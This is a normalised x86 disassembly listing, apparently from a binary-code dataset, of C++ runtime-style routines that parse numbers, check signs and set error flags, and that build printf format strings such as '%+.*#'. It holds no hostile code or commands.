push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_1001bb94
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10006709
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_100040ba
push 0x38
mov eax sub_100483df
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10007b59
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_10005198
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10007b41
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_1001bb94
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10006709
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_10004185
push 0x38
mov eax sub_10048beb
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007b59
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_10005198
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001bd2f
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10006709
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_10004233
push 0x38
mov eax sub_10048beb
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007b59
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_10005198
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001bb94
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10006709
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_100042e1
push 0x3c
mov eax sub_10047c41
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007b59
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_10005198
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001bdd4
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10006709
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_10004398
push 0x3c
mov eax sub_10047c41
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007b59
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_10005198
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001be97
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10006709
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_1000444f
push 0x50
mov eax sub_10047c6e
call sub_10023e9c
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x54 ] 0x0
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x50 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007b59
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x54 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x50 ]
call sub_100054e8
add esp 0x14
push eax
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_1001c09c
fstp [ ebp - 0x50 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x58 ]
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10006709
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x5c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
fld [ ebp - 0x50 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_10023f1f
retn 0x20
sub_100044f7
push 0x54
mov eax sub_1004840c
call sub_10023e9c
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x50 ] 0x0
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007b59
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x50 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x5c ]
call sub_100054e8
add esp 0x14
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_1001c0be
fstp [ ebp - 0x60 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x54 ]
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10006709
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x58 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
fld [ ebp - 0x60 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_10023f1f
retn 0x20
sub_1000459f
push 0x54
mov eax sub_1004840c
call sub_10023e9c
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x50 ] 0x0
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007b59
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x50 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x5c ]
call sub_100054e8
add esp 0x14
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_1001c127
fstp [ ebp - 0x60 ]
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x54 ]
call sub_10007b41
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10006709
test al al
je r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x58 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
fld [ ebp - 0x60 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
call sub_10023f1f
retn 0x20
sub_10004647
push 0x38
mov eax sub_10048bbe
call sub_10023e9c
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007b59
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_10005198
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_10007b41
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001bb94
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10006709
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_10023f1f
retn 0x20
sub_1000471a
push 0xc
mov eax sub_1004a0ca
call sub_10023e33
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ edi + eax ] r--data
mov eax [ edi ]
mov [ edi + 0x4 ] ebx
mov esi [ eax + 0x4 ]
add esi edi
call sub_10006f2b
mov eax [ ebp + 0xc ]
mov [ esi + 0x28 ] eax
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ esi + 0x2c ] ebx
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10007802
pop ecx
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] bl
call sub_10007b41
mov ecx [ ebp - 0x10 ]
mov eax [ ecx ]
push 0x20
call [ eax + 0x28 ]
mov [ esi + 0x30 ] ax
cmp [ esi + 0x28 ] ebx
jne r-xdata
mov [ esi + 0x4 ] ebx
mov eax edi
call sub_10023f0b
retn 0x8
mov eax [ esi + 0x8 ]
or eax 0x4
push ebx
push esi
mov ecx eax
call sub_10007d13
sub_100047a8
push 0x0
mov eax sub_10048949
call sub_10023e33
mov esi [ ebp + 0x8 ]
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_1001b074
xor edi edi
push 0x4
mov [ ebp - 0x4 ] edi
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor eax eax
mov ecx eax
call sub_1000710a
jmp r-xdata
mov [ esi + 0x38 ] eax
lea ecx [ esi + 0x18 ]
mov [ esi + 0x20 ] ecx
lea ecx [ esi + 0x1c ]
mov [ esi + 0x24 ] ecx
lea eax [ esi + 0x8 ]
mov [ esi + 0x10 ] eax
lea ecx [ esi + 0x28 ]
mov [ esi + 0x30 ] ecx
lea eax [ esi + 0xc ]
mov [ esi + 0x14 ] eax
lea ecx [ esi + 0x2c ]
mov [ esi + 0x34 ] ecx
mov [ eax ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov eax [ esi + 0x34 ]
mov [ eax ] edi
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
mov [ eax ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] edi
mov eax esi
call sub_10023f0b
retn 0x4
sub_10004879
push ebx
mov ebx eax
mov eax [ esi + 0x40 ]
and eax 0x6
cmp al 0x6
je r-xdata
pop ebx
retn 0x4
push edi
push 0x0
push ebx
call sub_10001e90
push ebx
push [ esp + 0x18 ]
mov edi eax
push ebx
push edi
call sub_1000255d
lea eax [ ebx + ebx ]
add esp 0x18
test [ esi + 0x40 ] 0x4
lea ecx [ eax + edi ]
mov [ esi + 0x3c ] ecx
jne r-xdata
mov edx [ esi + 0x40 ]
test dl 0x2
jne r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] edi
mov edx [ esi + 0x20 ]
mov [ edx ] edi
mov ebx [ esi + 0x30 ]
mov edx eax
sar edx 0x1
mov [ ebx ] edx
or [ esi + 0x40 ] 0x1
pop edi
test dl 0x10
jne r-xdata
mov edx [ esi + 0x14 ]
mov [ edx ] edi
mov edx [ esi + 0x24 ]
sub eax ecx
mov [ edx ] ecx
mov ecx [ esi + 0x34 ]
add eax edi
sar eax 0x1
mov [ ecx ] eax
mov eax [ esi + 0x20 ]
cmp [ eax ] 0x0
jne r-xdata
mov ecx edi
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
and [ eax ] 0x0
mov eax [ esi + 0x30 ]
sar edi 0x1
mov [ eax ] edi
sub_10004909
mov eax [ esp + 0x8 ]
push ebx
mov ebx [ esp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test bl 0x20
je r-xdata
test bl 0x10
je r-xdata
mov [ ecx ] 0x2b
inc ecx
mov dl [ esp + 0x10 ]
mov [ ecx ] 0x2e
inc ecx
mov [ ecx ] 0x2a
inc ecx
test dl dl
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov edx 0x3000
and ebx edx
cmp ebx 0x2000
jne r-xdata
mov [ ecx ] dl
inc ecx
cmp ebx edx
jne r-xdata
mov dl 0x66
jmp r-xdata
cmp ebx 0x1000
setne dl
lea edx [ edx + edx + 0x65 ]
mov dl 0x61
jmp r-xdata
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
retn
sub_1000496d
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10048f2b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x70
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x68 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x80 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov [ esp + 0x38 ] eax
lea eax [ esp + 0x3c ]
push eax
mov [ esp + 0x28 ] ecx
call sub_10007b59
and [ esp + 0x88 ] 0x0
push eax
call sub_100063b6
or [ esp + 0x8c ] 0xffffffff
pop ecx
mov ebx eax
lea ecx [ esp + 0x3c ]
mov [ esp + 0x30 ] ebx
call sub_10007b41
lea eax [ esp + 0x5c ]
push eax
mov ecx ebx
call sub_10005db0
mov [ esp + 0x88 ] 0x1
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
xor ebx ebx
push ebx
lea ecx [ esp + 0x44 ]
mov [ esp + 0x2c ] eax
mov [ esp + 0x5c ] 0xf
call sub_10002493
lea eax [ edi + 0x8 ]
push eax
push ebx
push 0x30
mov [ esp + 0x94 ] 0x2
call sub_100070de
movzx eax ax
mov [ esp + 0x2c ] eax
mov al [ esi ]
add esp 0xc
cmp al 0x2b
je r-xdata
mov [ esp + 0x2c ] 0x1
mov [ esp + 0x2c ] ebx
cmp al 0x2d
jne r-xdata
cmp [ esp + 0x74 ] 0x10
mov eax [ esp + 0x60 ]
jae r-xdata
mov [ ebp + 0x2c ] ebx
call sub_100208a9
mov eax [ eax ]
push [ ebp + 0x30 ]
mov al [ eax ]
push 0x65
push esi
mov [ esp + 0x20 ] al
mov [ esp + 0x21 ] 0x65
mov [ esp + 0x22 ] 0x0
call sub_100208d0
push [ ebp + 0x30 ]
mov [ esp + 0x20 ] eax
movsx eax [ esp + 0x24 ]
push eax
push esi
call sub_100208d0
add esp 0x18
mov [ esp + 0x18 ] eax
cmp eax ebx
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ esp + 0x60 ]
mov ecx [ ebp + 0x28 ]
mov eax [ ebp + 0x24 ]
mov edx [ esp + 0x24 ]
add eax ecx
add eax [ ebp + 0x2c ]
mov ecx [ edx + 0x18 ]
add eax [ ebp + 0x30 ]
cmp ecx ebx
jle r-xdata
cmp [ esp + 0x74 ] 0x10
mov eax [ esp + 0x60 ]
jae r-xdata
mov [ esp + 0x10 ] ebx
cmp ecx eax
jbe r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ esp + 0x60 ]
movsx eax [ esp + 0x14 ]
push [ ebp + 0x30 ]
push eax
push esi
call sub_100208d0
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax 0x100
jne r-xdata
sub ecx eax
mov [ esp + 0x10 ] ecx
jmp r-xdata
push [ ebp + 0x30 ]
lea ecx [ esp + 0x44 ]
push esi
call sub_10007042
mov eax [ esp + 0x10 ]
cmp eax ebx
jne r-xdata
push [ ebp + 0x30 ]
push 0x65
push esi
call sub_100208d0
add esp 0xc
cmp eax ebx
je r-xdata
push [ esp + 0x28 ]
sub eax esi
inc eax
mov ebx eax
lea eax [ ebx - 0x1 ]
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ esp + 0x28 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10005cdd
mov ecx [ eax ]
push [ ebp + 0x24 ]
mov [ ebp + 0x10 ] ecx
push [ esp + 0x40 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x44 ]
push eax
push edi
call sub_1000516f
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ esp + 0x64 ]
mov [ ebp + 0x14 ] eax
mov eax [ ecx ]
add esp 0x34
call [ eax + 0x4 ]
movzx eax ax
push 0x1
push eax
push [ ebp + 0x14 ]
lea eax [ esp + 0x3c ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1000516f
mov ecx [ eax ]
push [ ebp + 0x28 ]
mov [ ebp + 0x10 ] ecx
push [ esp + 0x3c ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x58 ]
push eax
push edi
call sub_1000516f
mov ecx [ eax ]
sub [ ebp + 0x30 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x30
add esi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
push [ esp + 0x10 ]
lea eax [ esp + 0x1c ]
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1000516f
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ esp + 0x28 ] ebx
mov [ ebp + 0x14 ] eax
add esp 0x18
cmp [ esp + 0x2c ] ebx
jbe r-xdata
mov eax [ edx + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
cmp [ esp + 0x18 ] ebx
jne r-xdata
push 0x30
push [ ebp + 0x2c ]
lea ecx [ esp + 0x48 ]
call sub_10005af7
jmp r-xdata
push [ esp + 0x28 ]
lea eax [ esp + 0x34 ]
push [ ebp + 0x30 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10005cdd
mov ecx [ eax ]
push [ ebp + 0x2c ]
mov [ ebp + 0x10 ] ecx
push [ esp + 0x40 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x44 ]
push eax
push edi
call sub_1000516f
mov ecx [ eax ]
push [ esp + 0x44 ]
mov edx [ esp + 0x5c ]
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ esp + 0x7c ]
mov [ ebp + 0x14 ] eax
push edi
mov [ edx + 0x18 ] ebx
call sub_1000516f
add esp 0x4c
push ebx
push 0x1
lea ecx [ esp + 0x48 ]
call sub_100023ce
push ebx
push 0x1
lea ecx [ esp + 0x64 ]
call sub_100023ce
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x80 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x68 ]
xor ecx esp
call sub_10020040
mov esp ebp
pop ebp
retn
push [ esp + 0x28 ]
sub eax esi
inc eax
mov ebx eax
lea eax [ ebx - 0x1 ]
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ esp + 0x40 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10005cdd
mov ecx [ eax ]
push [ ebp + 0x2c ]
mov [ ebp + 0x10 ] ecx
push [ esp + 0x40 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x5c ]
push eax
push edi
call sub_1000516f
mov ecx [ eax ]
and [ ebp + 0x2c ] 0x0
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
mov ecx [ esp + 0x58 ]
add esp 0x34
test [ ecx + 0x10 ] 0x4
mov ecx r--data
jne r-xdata
push 0x1
push esi
push [ ebp + 0x14 ]
lea eax [ esp + 0x24 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10005c92
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
inc esi
dec [ ebp + 0x30 ]
mov [ ebp + 0x14 ] eax
push 0x30
push [ ebp + 0x2c ]
sub eax esi
push eax
lea ecx [ esp + 0x4c ]
call sub_10005b45
push 0x30
push [ ebp + 0x24 ]
lea ecx [ esp + 0x48 ]
call sub_10005af7
mov eax [ esp + 0x10 ]
mov [ ebp + 0x24 ] ebx
mov eax [ esp + 0x18 ]
push 0x30
lea ecx [ esp + 0x44 ]
cmp eax ebx
jne r-xdata
push 0x1
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x40 ]
push eax
push edi
call sub_10005c92
mov ecx [ eax ]
sub [ ebp + 0x30 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
add esi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
mov ecx r--data
push [ ebp + 0x28 ]
sub eax esi
mov [ esp + 0x20 ] eax
inc eax
push eax
call sub_10005b45
push 0x30
push [ ebp + 0x24 ]
lea ecx [ esp + 0x48 ]
push [ esp + 0x20 ]
call sub_10005b45
mov [ ebp + 0x28 ] ebx
push [ ebp + 0x24 ]
call sub_10005af7
jmp r-xdata
lea eax [ esp + 0x14 ]
push eax
push ebx
lea ecx [ esp + 0x48 ]
call sub_10005bdf
push eax
call sub_10020980
pop ecx
pop ecx
mov [ esp + 0x10 ] eax
jmp r-xdata
lea esi [ esp + 0x60 ]
cmp [ esp + 0x74 ] 0x10
mov esi [ esp + 0x60 ]
mov [ ebp + 0x24 ] ebx
jae r-xdata
mov al [ esi ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
push ebx
lea ecx [ esp + 0x44 ]
call sub_10005bdf
mov esi eax
mov eax [ esp + 0x54 ]
mov [ ebp + 0x2c ] ebx
mov [ ebp + 0x30 ] eax
mov ecx [ esp + 0x10 ]
sub ecx [ esp + 0x2c ]
movsx eax al
cmp eax ecx
jae r-xdata
sub [ esp + 0x10 ] eax
push ebx
push 0x1
push [ esp + 0x18 ]
lea ecx [ esp + 0x4c ]
call sub_10005b45
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov esi eax
sub_10004e6d
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test dl 0x20
je r-xdata
test dl 0x8
je r-xdata
mov [ ecx ] 0x2b
inc ecx
push ebx
push esi
push edi
mov edi [ esp + 0x18 ]
mov bl [ edi ]
cmp bl 0x4c
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov [ ecx ] 0x49
inc ecx
mov [ ecx ] 0x36
inc ecx
mov [ ecx ] 0x34
mov [ ecx ] bl
jmp r-xdata
cmp esi 0x800
